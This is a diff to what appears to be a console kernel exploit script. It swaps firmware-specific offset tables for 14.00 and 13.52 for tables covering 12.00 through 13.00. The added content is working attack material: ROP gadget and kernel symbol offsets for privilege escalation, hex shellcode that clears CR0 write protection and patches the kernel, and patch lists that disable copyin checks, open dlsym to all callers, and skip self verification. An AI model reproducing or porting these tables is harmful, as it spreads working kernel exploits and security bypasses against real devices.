@@ -48,21 +48,45 @@ const S = {
    written once. The 13.52 column was derived from the two kernel images
    offline and cross-checked against a second method per value. */
 const FIRMWARE = {
-  "14.00": {
-    anchor:    0x00e6c60,   /* the lock the leak hands us */
-    swap_rbp:  0x0a80f68,   /* xchg rbp,rax ; ret */
-    prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
+  "13.00": {
+    anchor:    0x00e6c20,
+    swap_rbp:  0x0a803c8,
+    prison0:   0x111fa18,
     rootvnode: 0x2136e90,
-    padding:   0x0b39d98,   /* start of the zero run behind kernel text */
-    ghKmem:    0x0466540,
+    padding:   0x0b39218,
+    ghKmem:    0x0465a40,
   },
-  "13.52": {
-    anchor:    0x00e6c60,   /* same function, same place */
-    swap_rbp:  0x0a80c98,   /* 4e 95 c3, the only match in text */
-    prison0:   0x111fa18,   /* same, decoded from the same instruction */
+  "12.00": {
+    anchor:    0x00e6c20,
+    swap_rbp:  0x0a80188,
+    prison0:   0x111fa18,
     rootvnode: 0x2136e90,
-    padding:   0x0b39ad8,
-    ghKmem:    0x0466290,
+    padding:   0x0b38fd8,
+    ghKmem:    0x04659e0,
+  },
+  "12.02": {
+    anchor:    0x00e6c20,
+    swap_rbp:  0x0a80188,
+    prison0:   0x111fa18,
+    rootvnode: 0x2136e90,
+    padding:   0x0b38fd8,
+    ghKmem:    0x04659e0,
+  },
+  "12.50": {
+    anchor:    0x00e6c20,
+    swap_rbp:  0x0a80248,
+    prison0:   0x111fa18,
+    rootvnode: 0x2136e90,
+    padding:   0x0b39098,
+    ghKmem:    0x0465a20,
+  },
+  "12.52": {
+    anchor:    0x00e6c20,
+    swap_rbp:  0x0a80248,
+    prison0:   0x111fa18,
+    rootvnode: 0x2136e90,
+    padding:   0x0b39098,
+    ghKmem:    0x0465a20,
   },
 };
 
@@ -112,17 +136,35 @@ const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/d
    is one blob per firmware. Between 13.52 and 14.00 exactly two of its ten
    write targets moved -- the two 0x33 -> 0x37 immediates. */
 const BOOTSTRAP_TABLE = {
-  "14.00":
-      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+  "12.00":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
     + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
     + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
-    + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
+    + "488991882d1001c781ac2d100101000000c6811aa71f0037c6811da71f00370f"
     + "20c0480d000001000f22c031c0c3",
-  "13.52":
-      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+  "12.02":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
     + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
     + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
-    + "488991882d1001c781ac2d100101000000c6813aa81f0037c6813da81f00370f"
+    + "488991882d1001c781ac2d100101000000c6811aa71f0037c6811da71f00370f"
+    + "20c0480d000001000f22c031c0c3",
+  "12.50":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c6815aa71f0037c6815da71f00370f"
+    + "20c0480d000001000f22c031c0c3",
+  "12.52":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c6815aa71f0037c6815da71f00370f"
+    + "20c0480d000001000f22c031c0c3",
+  "13.00":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c6817aa71f0037c6817da71f00370f"
     + "20c0480d000001000f22c031c0c3",
 };
 
@@ -146,39 +188,90 @@ function setFirmware(fw) {
 }
 
 const PATCH_TABLE = {
-  "14.00": [
-  [0x0000acd, "eb",       "bcopy"],
-  [0x02bd79d, "eb",       "bzero"],
-  [0x02bd7e1, "eb",       "pagezero"],
-  [0x02bd85d, "eb",       "memcpy"],
-  [0x02bd8a1, "eb",       "pagecopy"],
-  [0x02bda4d, "eb",       "copyin"],
-  [0x02bdefd, "eb",       "copyinstr"],
-  [0x02bdfcd, "eb",       "copystr"],
-  [0x01b7a43, "eb04",     "dlsym, first check"],
-  [0x01b7a53, "eb04",     "dlsym, second check"],
-  [0x01b7a73, "90e9",     "dlsym, nop and jump"],
-  [0x01b7504, "90e9",     "load_prx"],
-  [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
-  [0x0628684, "eb00",     "self verification"],
-  [0x0628f6f, "eb00",     "delayed panic on suspend"],
+  "12.00": [
+  [0x0000acd, "eb",        "bcopy"],
+  [0x02bd3cd, "eb",        "bzero"],
+  [0x02bd411, "eb",        "pagezero"],
+  [0x02bd48d, "eb",        "memcpy"],
+  [0x02bd4d1, "eb",        "pagecopy"],
+  [0x02bd67d, "eb",        "copyin"],
+  [0x02bdb2d, "eb",        "copyinstr"],
+  [0x02bdbfd, "eb",        "copystr"],
+  [0x01b76a3, "eb04",      "dlsym, first check"],
+  [0x01b76b3, "eb04",      "dlsym, second check"],
+  [0x01b76d3, "90e9",      "dlsym, nop and jump"],
+  [0x01b7164, "90e9",      "load_prx"],
+  [0x01b7718, "90e93c01",  "dlsym, open it to every caller"],
+  [0x0627af4, "eb00",      "self verification"],
+  [0x06283df, "eb00",      "delayed panic on suspend"],
   ],
-  "13.52": [
-  [0x0000acd, "eb",       "bcopy"],
-  [0x02bd4ed, "eb",       "bzero"],
-  [0x02bd531, "eb",       "pagezero"],
-  [0x02bd5ad, "eb",       "memcpy"],
-  [0x02bd5f1, "eb",       "pagecopy"],
-  [0x02bd79d, "eb",       "copyin"],
-  [0x02bdc4d, "eb",       "copyinstr"],
-  [0x02bdd1d, "eb",       "copystr"],
-  [0x01b77a3, "eb04",     "dlsym, first check"],
-  [0x01b77b3, "eb04",     "dlsym, second check"],
-  [0x01b77d3, "90e9",     "dlsym, nop and jump"],
-  [0x01b7264, "90e9",     "load_prx"],
-  [0x01b7818, "90e93c01", "dlsym, open it to every caller"],
-  [0x06283c4, "eb00",     "self verification"],
-  [0x0628caf, "eb00",     "delayed panic on suspend"],
+  "12.02": [
+  [0x0000acd, "eb",        "bcopy"],
+  [0x02bd3cd, "eb",        "bzero"],
+  [0x02bd411, "eb",        "pagezero"],
+  [0x02bd48d, "eb",        "memcpy"],
+  [0x02bd4d1, "eb",        "pagecopy"],
+  [0x02bd67d, "eb",        "copyin"],
+  [0x02bdb2d, "eb",        "copyinstr"],
+  [0x02bdbfd, "eb",        "copystr"],
+  [0x01b76a3, "eb04",      "dlsym, first check"],
+  [0x01b76b3, "eb04",      "dlsym, second check"],
+  [0x01b76d3, "90e9",      "dlsym, nop and jump"],
+  [0x01b7164, "90e9",      "load_prx"],
+  [0x01b7718, "90e93c01",  "dlsym, open it to every caller"],
+  [0x0627af4, "eb00",      "self verification"],
+  [0x06283df, "eb00",      "delayed panic on suspend"],
+  ],
+  "12.50": [
+  [0x0000acd, "eb",        "bcopy"],
+  [0x02bd40d, "eb",        "bzero"],
+  [0x02bd451, "eb",        "pagezero"],
+  [0x02bd4cd, "eb",        "memcpy"],
+  [0x02bd511, "eb",        "pagecopy"],
+  [0x02bd6bd, "eb",        "copyin"],
+  [0x02bdb6d, "eb",        "copyinstr"],
+  [0x02bdc3d, "eb",        "copystr"],
+  [0x01b76e3, "eb04",      "dlsym, first check"],
+  [0x01b76f3, "eb04",      "dlsym, second check"],
+  [0x01b7713, "90e9",      "dlsym, nop and jump"],
+  [0x01b71a4, "90e9",      "load_prx"],
+  [0x01b7758, "90e93c01",  "dlsym, open it to every caller"],
+  [0x0627b34, "eb00",      "self verification"],
+  [0x062841f, "eb00",      "delayed panic on suspend"],
+  ],
+  "12.52": [
+  [0x0000acd, "eb",        "bcopy"],
+  [0x02bd40d, "eb",        "bzero"],
+  [0x02bd451, "eb",        "pagezero"],
+  [0x02bd4cd, "eb",        "memcpy"],
+  [0x02bd511, "eb",        "pagecopy"],
+  [0x02bd6bd, "eb",        "copyin"],
+  [0x02bdb6d, "eb",        "copyinstr"],
+  [0x02bdc3d, "eb",        "copystr"],
+  [0x01b76e3, "eb04",      "dlsym, first check"],
+  [0x01b76f3, "eb04",      "dlsym, second check"],
+  [0x01b7713, "90e9",      "dlsym, nop and jump"],
+  [0x01b71a4, "90e9",      "load_prx"],
+  [0x01b7758, "90e93c01",  "dlsym, open it to every caller"],
+  [0x0627b34, "eb00",      "self verification"],
+  [0x062841f, "eb00",      "delayed panic on suspend"],
+  ],
+  "13.00": [
+  [0x0000acd, "eb",        "bcopy"],
+  [0x02bd42d, "eb",        "bzero"],
+  [0x02bd471, "eb",        "pagezero"],
+  [0x02bd4ed, "eb",        "memcpy"],
+  [0x02bd531, "eb",        "pagecopy"],
+  [0x02bd6dd, "eb",        "copyin"],
+  [0x02bdb8d, "eb",        "copyinstr"],
+  [0x02bdc5d, "eb",        "copystr"],
+  [0x01b76e3, "eb04",      "dlsym, first check"],
+  [0x01b76f3, "eb04",      "dlsym, second check"],
+  [0x01b7713, "90e9",      "dlsym, nop and jump"],
+  [0x01b71a4, "90e9",      "load_prx"],
+  [0x01b7758, "90e93c01",  "dlsym, open it to every caller"],
+  [0x0627b84, "eb00",      "self verification"],
+  [0x062846f, "eb00",      "delayed panic on suspend"],
   ],
 };
 
